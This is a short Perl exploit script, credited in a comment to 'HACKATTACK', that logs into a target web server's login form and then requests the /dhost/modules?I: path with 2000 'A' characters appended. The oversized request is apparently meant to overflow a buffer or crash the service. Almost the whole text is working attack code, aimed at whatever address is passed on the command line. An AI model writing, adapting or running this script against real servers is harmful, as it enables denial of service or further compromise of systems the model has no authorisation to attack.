#!usr\bin\perl
#Vulnerability has found by HACKATTACK

use WWW::Mechanize;

use LWP::Debug qw(+);

use HTTP::Cookies;

$address=$ARGV[0];


if(!$ARGV[0]){

        print "Usage:perl $0 address\n";
        
exit();
}



$login = "$address/_LOGIN_SERVER_";

$url = "$address/dhost/";

$module = "modules?I:";

$buffer = "A" x 2000;


$vuln = $module.$buffer;

#Edit the username and password.

          $user = "username";

          $pass = "password";

#Edit the username and password.

my $mechanize = WWW::Mechanize->new();


$mechanize->cookie_jar(HTTP::Cookies->new(file => "$cookie_file",autosave => 1));


$mechanize->timeout($url_timeout);

$res = $mechanize->request(HTTP::Request->new('GET', "$login"));


    $mechanize->submit_form(

                  form_name => "authenticator",

                  fields    => {

                     usr => $user,

                     pwd => $pass},

                     button => 'Login');

$response2 = $mechanize->get("$url$vuln");
